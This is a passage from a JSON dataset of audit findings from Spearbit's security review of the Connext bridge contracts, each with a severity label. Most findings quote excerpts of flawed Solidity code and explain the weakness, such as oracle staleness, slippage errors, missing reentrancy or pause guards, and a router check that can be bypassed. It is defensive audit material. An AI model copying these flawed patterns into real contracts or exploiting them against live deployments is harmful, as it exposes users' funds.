_fee); ... } } library AssetLogic { function _swapAsset(...) ... { ... SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amount); ... } } contract Executor is IExecutor { function execute( ... ) ... { ... SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); ... } }", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "_slippageTol does not adjust for decimal differences", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Users set the slippage tolerance in percentage. The assetLogic calculates: minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR Then assetLogic uses minReceived in the swap functions. The minReceived, however, does not adjust for the decimal differences between assetIn and assetOut. Users will either always hit the slippage or suffer huge slippage when assetIn and assetOut have a different number of decimals. Assume the number of decimals of assetIn is 6 and the decimal of assetOut is 18. The minReceived will be set to 10-12 smaller than the correct value. Users would be vulnerable to sandwich attacks in this case. Assume the number of decimals of assetIn is 18 and the number of decimals of assetOut is 6. The minReceived will be set to 1012 larger than the correct value. Users would always hit the slippage and the cross-chain transfer will get stuck. 25 library AssetLogic { function _swapAsset(... ) ... { // Swap the asset to the proper local asset uint256 minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR; ... return (pool.swapExact(_amount, _assetIn, _assetOut, minReceived), _assetOut); ... } }", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "Canonical assets should be keyed on the hash of domain and id", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "A canonical asset is a tuple of a (domain, id) pair. TokenRegistrys owner has the power to regis- ter new tokens in the system (See TokenRegistry.ensureLocalToken() and TokenRegistry.enrollCustom()). A canonical asset is registered using the hash of its domain and id (See TokenRegistry._setCanonicalToRepre- sentation()). Connext uses only the id of a canonical asset to uniquely identify. Here are a few references:  swapStorages  canonicalToAdopted It is an issue if TokenRegistry registers two canonical assets with the same id. canonical asset an unintended one might be transferred to the destination chain, of the transfers may revert. If this id fetches the incorrect", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "Missing checks for Chainlink oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "ConnextPriceOracle.getTokenPrice() function goes through a series of oracles. At each step, it has a few validations to avoid incorrect price. If such validations succeed, the function returns the non-zero oracle price. For the Chainlink oracle, getTokenPrice() ultimately calls getPriceFromChainlink() which has the following validation  if (answer == 0 || answeredInRound < roundId || updateAt == 0) { // answeredInRound > roundId ===> ChainLink Error: Stale price // updatedAt = 0 ===> ChainLink Error: Round not complete return 0; } updateAt refers to the timestamp of the round. This value isnt checked to make sure it is recent. 26 Additionally, it is important to be aware of the minAnswer and maxAnswer of the Chainlink oracle, these values are not allowed to be reached or surpassed. See Chainlink API reference for documentation on minAnswer and maxAnswer as well as this piece of code: OffchainAggregator.sol", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "Same params.SlippageTol is used in two different swaps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The Connext protocol does a cross-chain transfer with the help of the Nomad protocol. to use the Nomad protocol, Connext has to convert the adopted token into the local token. For a cross-chain transfer, users take up two swaps. Adopted -> Local at the source chain and Local -> Adopted at the destination chain. BridgeFacet.sol#L299-L304 function xcall(XCallArgs calldata _args) external payable whenNotPaused nonReentrant returns (bytes32) { ... // Swap to the local asset from adopted if applicable. (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded( canonical, transactingAssetId, amount, _args.params.slippageTol ); ... } BridgeFacet.sol#L637 function _handleExecuteLiquidity( bytes32 _transferId, bytes32 _canonicalId, bool _isFast, ExecuteArgs calldata _args ) private returns (uint256, address) { ... // swap out of mad* asset into adopted asset if needed return AssetLogic.swapFromLocalAssetIfNeeded(_canonicalId, _args.local, toSwap, _args.params.slippageTol); ,! } The same slippage tolerance _args.params.slippageTol is used in two swaps. In most cases users cannot set the correct slippage tolerance to protect two swaps. Assume the Nomad asset is slightly cheaper in both chains. 1 Nomad asset equals 1.01 adopted asset. An expected swap would be:1 adopted -> 1.01 Nomad asset -> 1 adopted. The right slippage tolerance should be set at 1.01 and 0.98 respectively. Users cannot set the correct tolerance with a single parameter. This makes users vulnerable to MEV searchers. Also, user transfers get stuck during periods of instability.", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "getTokenPrice() returns stale token prices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "getTokenPrice() reads from the assetPrices[tokenAddress].price mapping which stores the latest price as configured by the protocol admin in setDirectPrice(). However, the check for a stale token price will never fallback to other price oracles as tokenPrice != 0. Therefore, the stale token price will be unintentionally returned.", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Potential division by zero if gas token oracle is faulty", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "In the event that the gas token oracle is faulty and returns malformed values, the call to reim- burseRelayerFees() in _handleExecuteTransaction() will fail. Fortunately, the low-level call() function will not prevent the transfer from being executed, however, this may lead to further issues down the line if changes are made to the sponsor vault.", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Burn does not lower allowance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function _takeTokens() of BridgeRouter takes in the tokens from the sender. Sometimes it transfers them and sometimes it burns them. In the case of burning the tokens, the allowance isnt \"used up\". 28 function _takeTokens(... ) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount); ... } else { ... _t.burn(msg.sender, _amount); ... } ... // doesn't use up the allowance } contract BridgeToken is Version0, IBridgeToken, OwnableUpgradeable, ERC20 { ... function burn(address _from, uint256 _amnt) external override onlyOwner { _burn(_from, _amnt); } }", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Two step ownership transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function setAdmin() transfer ownership to a new address. In case a wrong address is supplied ownership is inaccessible. The same issue occurs with transferOwnership of OwnableUpgradeable in several Nomad contracts. Additionally the Nomad contract try to prevent renounceOwnership, however, this can also be accomplished with transferOwnership to a non existing address. Relevant Nomad contracts:  TokenRegistry.sol  NomadBase.sol  UpdaterManager.sol  XAppConnectionManager.sol 29 contract ConnextPriceOracle is PriceOracle { ... function setAdmin(address newAdmin) external onlyAdmin { address oldAdmin = admin; admin = newAdmin; emit NewAdmin(oldAdmin, newAdmin); } } contract BridgeRouter is Version0, Router { ... /** * @dev should be impossible to renounce ownership; * * */ we override OpenZeppelin OwnableUpgradeable's implementation of renounceOwnership to make it a no-op function renounceOwnership() public override onlyOwner { // do nothing } }", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Function removeRouter does not clear approvedForPortalRouters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function removeRouter() clears most of the fields of the struct RouterPermissionsManagerInfo except for approvedForPortalRouters. However, it is still good to also remove approvedForPortalRouters in removeRouter() because if the router were to be added again later (via setupRouter() ) or _isRouterOwnershipRenounced is set in the future, the router would still have the old approvedForPortalRouters. 30 struct RouterPermissionsManagerInfo { mapping(address => bool) approvedRouters; // deleted mapping(address => bool) approvedForPortalRouters; // not deleted mapping(address => address) routerRecipients; // deleted mapping(address => address) routerOwners; // deleted mapping(address => address) proposedRouterOwners; // deleted mapping(address => uint256) proposedRouterTimestamp; // deleted } contract RoutersFacet is BaseConnextFacet { function removeRouter(address router) external onlyOwner { ... s.routerPermissionInfo.approvedRouters[router] = false; ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... delete s.routerPermissionInfo.proposedRouterOwners[router]; delete s.routerPermissionInfo.proposedRouterTimestamp[router]; } }", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Anyone can self burn lp token of the AMM", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When providing liquidity into the AMM pool, users get LP tokens. Users can redeem their shares of the liquidity by redeeming LP to the AMM pool. The current LPToken contract inherits Openzepplins ERC20BurnableUpgradeable. Users can burn their tokens by calling burn without notifying the AMM pools. ERC20BurnableUpgradeable.sol#L26-L28. Although users do not profit from this action, it brings up concerns such as:  An exploiter has an easy way to pump the LP price. Burning LP is similar to donating value to the pool. While its good for the pool, this gives the exploiter another tool to break other protocols. After the cream finance attack many protocols started to take extra caution and made this a restricted function (absorbing donation) github.com/yearn/yearn-security/blob/master/disclosures/2021-10-27.md.  Against the best practice. Every state of an AMM is related to price. Allowing external actors to change the AMM states without notifying the main contract is dangerous. Its also harder for a developer to build other novel AMM based on the same architecture. Note: the burn function is also not protected by nonReentrant or whenNotPaused.", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Skip timeout in diamondCut() (edge case)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Edge case: If someone manages to get an update through which deletes all facets then the next update skips the delay (because ds.facetAddresses.length will be 0). library LibDiamond { function diamondCut(...) ... { ... if (ds.facetAddresses.length != 0) { uint256 time = ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))]; require(time != 0 && time < block.timestamp, \"LibDiamond: delay not elapsed\"); } // Otherwise, this is the first instance of deployment and it can be set automatically ... } }", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Limit gas for s.executor.execute()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The call to s.executor.execute() in BridgeFacet might use up all available gas. In that case, the call to callback to report to the originator might not be called because the execution stops due an out of gas error. Note: the execute() function might be retried by the relayer so perhaps this will fix itself eventually. Note: excessivelySafeCall in Executor does limit the amount of gas. contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(...) ... { ... (bool success, bytes memory returnData) = s.executor.execute(...); // might use all available ,! gas ... // If callback address is not zero, send on the PromiseRouter if (_args.params.callback != address(0)) { s.promiseRouter.send(...); // might not have enough gas } ... } }", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Several external functions missing whenNotPaused mofifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The following functions dont have a whenNotPaused modifier while most other external functions do.  bumpTransfer of BridgeFacet.  forceReceiveLocal of BridgeFacet.  repayAavePortal of PortalFacet.  repayAavePortalFor of PortalFacet. Without whenNotPaused these functions can still be executed when the protocol is paused.", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Gas griefing attack on callback execution", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When the callback is executed on the source chain the following line can revert or consume all forwarded gas. In this case, the relayer wastes gas and doesnt get the callback fee. ICallback(callbackAddress).callback(transferId, _msg.returnSuccess(), _msg.returnData());", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Callback fails when returnData is empty", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "If a transfer involves a callback, PromiseRouter reverts if returnData is empty. if (_returnData.length == 0) revert PromiseRouter__send_returndataEmpty(); However, the callback should be allowed in case the user wants to report the calldata execution success on the destination chain (_returnSuccess).", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Redundant fee on transfer logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function repayAavePortalFor() has logic for fee on transfer tokens. However, handleIncomin- gAsset() doesnt allow fee on transfer tokens. So this extra code shouldnt be necessary in repayAavePortal- For(). function repayAavePortalFor(...) ... { ... (, uint256 amount) = AssetLogic.handleIncomingAsset(_adopted, total, 0); ... // If this was a fee on transfer token, reduce the total if (amount < total) { uint256 missing; unchecked { missing = total - amount; } if (missing < _feeAmount) { // Debit fee amount unchecked { _feeAmount -= missing; } } else { // Debit backing amount unchecked { missing -= _feeAmount; } _feeAmount = 0; _backingAmount -= missing; } } ... } library AssetLogic { function handleIncomingAsset(...) ... { ... // Transfer asset to contract trueAmount = transferAssetToContract(_assetId, _assetAmount); .... } function transferAssetToContract(address _assetId, uint256 _amount) internal returns (uint256) { ... // Validate correct amounts are transferred uint256 starting = IERC20(_assetId).balanceOf(address(this)); SafeERC20.safeTransferFrom(IERC20(_assetId), msg.sender, address(this), _amount); // Ensure this was not a fee-on-transfer token if (IERC20(_assetId).balanceOf(address(this)) - starting != _amount) { revert AssetLogic__transferAssetToContract_feeOnTransferNotSupported(); } ... } } 34", "labels": ["Spearbit", "Connext", "Severity: Gas Optimization"]}, {"title": "Some gas can be saved in reimburseLiquidityFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Some gas can be saved by assigning tokenExchange before the if statement. This also improves readability. function reimburseLiquidityFees(...) ... { ... if (address(tokenExchanges[_token]) != address(0)) { // could use `tokenExchange` ITokenExchange tokenExchange = tokenExchanges[_token]; // do before the if }", "labels": ["Spearbit", "Connext", "Severity: Gas Optimization"]}, {"title": "LIQUIDITY_FEE_DENOMINATOR could be a constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The value of LIQUIDITY_FEE_DENOMINATOR seems to be constant. However, it is currently stored in s and requires an SLOAD operation to retrieve it, increasing gas costs. upgrade-initializers/DiamondInit.sol: BridgeFacet.sol: BridgeFacet.sol: PortalFacet.sol: AssetLogic.sol: s.LIQUIDITY_FEE_DENOMINATOR = 10000; toSwap = _getFastTransferAmount(..., s.LIQUIDITY_FEE_DENOMINATOR); s.portalFeeDebt[_transferId] = ... / s.LIQUIDITY_FEE_DENOMINATOR; if (_aavePortalFeeNumerator > s.LIQUIDITY_FEE_DENOMINATOR) ... uint256 minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR;", "labels": ["Spearbit", "Connext", "Severity: Gas Optimization"]}, {"title": "Access elements from storage array instead of loading them in memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "SwapUtils.removeLiquidityOneToken() function only needs the length and one element of the storage array self.pooledTokens. For this, the function reads the entire array in memory which costs extra gas. IERC20[] memory pooledTokens = self.pooledTokens; ... uint256 numTokens = pooledTokens.length; ... pooledTokens[tokenIndex].safeTransfer(msg.sender, dy); 35", "labels": ["Spearbit", "Connext", "Severity: Gas Optimization"]}, {"title": "Send information through calldata instead of having callee query Executor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Executor.originSender(), Executor.origin(), and Executor.amount() to permission crosschain calls. This costs extra gas because of staticcalls made to an external contract.", "labels": ["Spearbit", "Connext", "Severity: Gas Optimization"]}, {"title": "AAVE portal debt might not be repaid in full if debt is converted to interest paying", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The Aave portal mechanism gives routers access to a limited amount of unbacked debt which is to be used when fronting liquidity for cross-chain transfers. The process for receiving unbacked debt is as follows:  During message execution, the protocol checks if a single liquidity provider has bid on a liquidity auction which is handled by the relayer network.  If the provider has insufficient liquidity, the protocol attempts to utilize AAVE unbacked debt by minting uncol- lateralised aTokens and withdrawing them from the pool. The withdrawn amount is immediately used to pay out the recipient of the bridge transfer.  Currently the debt is fixed fee, see arc-whitelist-connext-for-v3-portals, however this might be changed in the future out of band.  Incase this would be changed: upon repayment, AAVE will actually expect unbackedDebt + fee + aToken interest. The current implementation will only track unbackedDebt + fee, hence, the protocol will accrue bad debt in the form of interest. Eventually, the extent of this bad debt will reach a point where the unbacked- MintCap has been reached and noone is able to pay off this debt. I consider this to be a long-term issue that could be handled in a future upgrade, however, it is important to highlight and address these issues early.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Routers pay the slippage cost for users when using AAVE credit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When routers do the fast of adopted token and _fastTransferAmount = * _fastTransferAmount /s.LIQUIDITY_FEE_DENOMINATOR _args.amount * s.LIQUIDITY_FEE_NUMERATOR / s.LIQUIDITY_FEE_DENOMINATOR. The routers get reimbursed _args.amount of local tokens afterward. Thus, the routers lose money if the slippage of swapping between local tokens and adopted tokens are larger than the liquidityFee. function _executePortalTransfer( bytes32 _transferId, bytes32 _canonicalId, uint256 _fastTransferAmount, address _router ) internal returns (uint256, address) { // Calculate local to adopted swap output if needed address adopted = s.canonicalToAdopted[_canonicalId]; ,! ,! ,! IAavePool(s.aavePool).mintUnbacked(adopted, _fastTransferAmount, address(this), AAVE_REFERRAL_CODE); // Improvement: Instead of withdrawing to address(this), withdraw directly to the user or executor to save 1 transfer uint256 amountWithdrawn = IAavePool(s.aavePool).withdraw(adopted, _fastTransferAmount, address(this)); if (amountWithdrawn < _fastTransferAmount) revert BridgeFacet__executePortalTransfer_insufficientAmountWithdrawn(); // Store principle debt s.portalDebt[_transferId] = _fastTransferAmount; // Store fee debt s.portalFeeDebt[_transferId] = (s.aavePortalFeeNumerator * _fastTransferAmount) / s.LIQUIDITY_FEE_DENOMINATOR; ,! emit AavePortalMintUnbacked(_transferId, _router, adopted, _fastTransferAmount); return (_fastTransferAmount, adopted); }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Optimize max checks in initializeSwap()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function initializeSwap() reverts if a value is >= ...MAX.... Probably should revert when > ...MAX.... function initializeSwap(...) ... { ... // Check _a, _fee, _adminFee, _withdrawFee parameters if (_a >= AmplificationUtils.MAX_A) revert SwapAdminFacet__initializeSwap_aExceedMax(); if (_fee >= SwapUtils.MAX_SWAP_FEE) revert SwapAdminFacet__initializeSwap_feeExceedMax(); if (_adminFee >= SwapUtils.MAX_ADMIN_FEE) revert SwapAdminFacet__initializeSwap_adminFeeExceedMax(); ... }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "All routers share the same AAVE debt", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The mintUnbacked amount is allocated to the calling contract (eg the Connext Diamond that has the BRIDGE role permission). Thus it is not separated to different routers, if one router does not payback its debt (in time) and has the max debt then this facility cannot be used any more. function _executePortalTransfer( ... ) ... { ... IAavePool(s.aavePool).mintUnbacked(adopted, _fastTransferAmount, address(this), AAVE_REFERRAL_CODE); ... }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Careful with fee on transfer tokens on AAVE loans", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The Aave function backUnbacked() does not account for fee on transfer tokens. If these happen to be used then the accounting might not be right. function _backLoan(...) ... { ... // back loan IAavePool(s.aavePool).backUnbacked(_asset, _backing, _fee); ... } library BridgeLogic { function executeBackUnbacked(... ) ... { ... reserve.unbacked -= backingAmount.toUint128(); reserve.updateInterestRates(reserveCache, asset, added, 0); IERC20(asset).safeTransferFrom(msg.sender, reserveCache.aTokenAddress, added); ... } }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Let getTokenPrice() also return the source of the price info", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function getTokenPrice() can get its prices information from multiple sources. For the caller it might be important to know which source was used. function getTokenPrice(address _tokenAddress) public view override returns (uint256) { }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Typos in the comments of _swapAsset() and _swapAssetOut()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "There are typos in the comments of _swapAsset() and _swapAssetOut(): * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool function _swapAsset(... ) ... * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool function _swapAssetOut(...) ...", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Consistently delete array entries in PromiseRouter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "In function process() of PromiseRouter.sol two different ways are used to clear a value: one with delete and the other with = 0. Although technically the same it better to use the same method to maintain consistency. function process(bytes32 transferId, bytes calldata _message) public nonReentrant { ... // remove message delete messageHashes[transferId]; // remove callback fees callbackFees[transferId] = 0; ... }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "getTokenPrice() will revert if setDirectPrice() is set in the future", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The setDirectPrice() function allows the protocol admin to update the price up to two seconds in the future. This impacts the getTokenPrice() function as the updated value may be slightly incorrect.", "labels": ["Spearbit", "Connext", "Severity: Low Risk"]}, {"title": "Roundup in words not optimal", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function words, which is used in the Nomad code base, tries to do a round up. Currently it adds 1 to the len. /** * @notice * @param memView * @return */ The number of memory words this memory view occupies, rounded up. The view uint256 - The number of memory words function words(bytes29 memView) internal pure returns (uint256) { return uint256(len(memView)).add(32) / 32; }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "callback could have capped returnData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function execute() caps the result of the call to excessivelySafeCall to a maximum of MAX_- COPY bytes, making sure the result is small enough to fit in a message sent back to the originator. However, when the callback is done the originator needs to be aware that the data can be capped and this fact is not clearly documented. 41 function execute(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, gas, isNative ? _args.amount : 0, MAX_COPY, _args.callData ); } function process(bytes32 transferId, bytes calldata _message) public nonReentrant { ... // execute callback ICallback(callbackAddress).callback(transferId, _msg.returnSuccess(), _msg.returnData()); // returnData is capped ... ,! }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Several external functions are not nonReentrant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The following functions dont have nonReentrant, while most other external functions do have such modifier.  bumpTransfer of BridgeFacet.  forceReceiveLocal of BridgeFacet.  repayAavePortal of PortalFacet.  repayAavePortalFor of PortalFacet.  initiateClaim of RelayerFacet. There are many swaps in the protocol and some of them should be conducted in an aggregator (not yet imple- mented). A lot of the aggregators use the difference between pre-swap balance and post-swap balance. (e.g. uniswap v3 router , 1inch, etc.. ). While this isnt exploitable yet, there is a chance that future updates might open up an issue to exploit.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "NomadFacet.reconcile() has an unused argument canonicalDomain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "NomadFacet.reconcile() has an unused argument canonicalDomain.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "SwapUtils._calculateSwap() returns two values with different precision", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "SwapUtils._calculateSwap() returns (uint256 dy, uint256 dyFee). dy is the amount of tokens a user will get from a swap and dyFee is the associated fee. To account for the different token decimal precision between the two tokens being swapped, a multipliers mapping is used to bring the precision to the same value. To return the final values, dy is changed back to the original token precision but dyFee is not. This is an internal function and the callers adjust the fee precision back to normal, therefore severity is informa- tional. But without documentation it is easy to miss.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Multicall.sol not compatible with Natspec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Multicall.sol Natspec comment specifies: /// @title Multicall - Aggregate results from multiple read-only function calls However, to call those functions it uses a low level call() method which can call write functions as well. (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "reimburseRelayerFees only what is necessary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function reimburseRelayerFees() gives a maximum of relayerFeeCap to a receiver, unless it already has a balance of relayerFeeCap. This implicitly means that a balance relayerFeeCap is sufficient. So if a receiver already has a balance only relayerFeeCap - _to.balance is required. This way more recipients can be reimbursed with the same amount of funds in the SponsorVault. function reimburseRelayerFees(...) ... { ... if (_to.balance > relayerFeeCap || Address.isContract(_to)) { // Already has fees, and the address is a contract return; } ... sponsoredFee = sponsoredFee >= relayerFeeCap ? relayerFeeCap : sponsoredFee; ... }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "safeIncreaseAllowance and safeDecreaseAllowance can be replaced with safeApprove in _recon- cileProcessPortal", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The NomadFacet uses safeIncreaseAllowance after clearing the allowance. creaseAllowance to clear the allowance. Using safeApprove is potentially safer in this case. Some non-standard tokens only allow the allowance to change from zero, or change to zero. Using safeDecreaseAllowance would potentially break the contract in a future update. Note that SafeApprove has been deprecated for the concern of a front-running attack. It is only supported when setting an initial allowance or setting the allowance to zero SafeERC20.sol#L38", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Event not emitted when ERC20 and native asset is transferred together to SponsorVault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Any ERC20 token or native asset can be transferred to SponsorVault contract by calling the de- posit() function. It emits a Deposit() event logging the transferred asset and the amount. However, if the native asset and an ERC20 token are transferred in the same call only a single event corresponding to the ERC20 transfer is emitted.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "payable keyword can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "If a function does not need to have the native asset sent to it it is recommended to not mark it as payable and avoid any funds getting. StableSwapFacet.sol has two payable functions: swapExact() and swapExactOut, which only swap ERC20 tokens and are not expected to receive the native asset.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Improve variable naming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Two different variables/functions with an almost identical name are prone to error. Variable names like _routerOwnershipRenounced and _assetOwnershipRenounced do not correctly reflect their meaning as they actually refer to the ownership whitelist being renounced. 45 function _isRouterOwnershipRenounced() internal view returns (bool) { return LibDiamond.contractOwner() == address(0) || s._routerOwnershipRenounced; } /** * @notice Indicates if the ownership of the asset whitelist has * been renounced */ function _isAssetOwnershipRenounced() internal view returns (bool) { ... bool _routerOwnershipRenounced; ... // 27 bool _assetOwnershipRenounced; The constant EMPTY is defined twice with different values. This is confusing and could lead to errors. contract BaseConnextFacet { ... bytes32 internal constant EMPTY = hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\"; ... ,! } library LibCrossDomainProperty { ... bytes29 public constant EMPTY = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"; ... } The function xcall() uses both _args.transactingAssetId and transactingAssetId. two, but they each have a very specific meaning and missing it introduces problems. It is easy to mix these function xcall(...) ... { ... address transactingAssetId = _args.transactingAssetId == address(0) ? address(s.wrapper) : _args.transactingAssetId; ... (, uint256 amount) = AssetLogic.handleIncomingAsset( _args.transactingAssetId, ... ); ... (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded( ..., transactingAssetId, ... ); ... } In the _handleExecuteTransaction function of BridgeFacet, _args.amount and _amount are used. In this func- tion:  _args.amount is equal to bridged_amount; 46  _amount is equal to bridged_amount - liquidityFee (and potentially swapped amount).", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "onlyRemoteRouter can be circumvented", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "BaseConnextFacet-fix. However, the change has not been applied to Router.sol#L56-L58 which is currently in use. The modifier onlyRemoteRouter() can be mislead if the sender parameter has the value 0. The modifier uses _m.sender() from the received message by Nomad. Assuming all checks of Nomad work as expected this value cannot be 0 as it originates from a msg.sender in Home.sol. contract Replica is Version0, NomadBase { function process(bytes memory _message) public returns (bool _success) { ... bytes29 _m = _message.ref(0); ... // ensure message has been proven bytes32 _messageHash = _m.keccak(); require(acceptableRoot(messages[_messageHash]), \"!proven\"); ... IMessageRecipient(_m.recipientAddress()).handle( _m.origin(), _m.nonce(), _m.sender(), _m.body().clone() ); ... } } contract BridgeRouter is Version0, Router { function handle(uint32 _origin,uint32 _nonce,bytes32 _sender,bytes memory _message) external override onlyReplica onlyRemoteRouter(_origin, _sender) { ... } } abstract contract Router is XAppConnectionClient, IMessageRecipient { ... modifier onlyRemoteRouter(uint32 _origin, bytes32 _router) { require(_isRemoteRouter(_origin, _router), \"!remote router\"); _; } function _isRemoteRouter(uint32 _domain, bytes32 _router) internal view returns (bool) { return remotes[_domain] == _router; // if _router == 0 then this is true for random _domains } }", "labels": 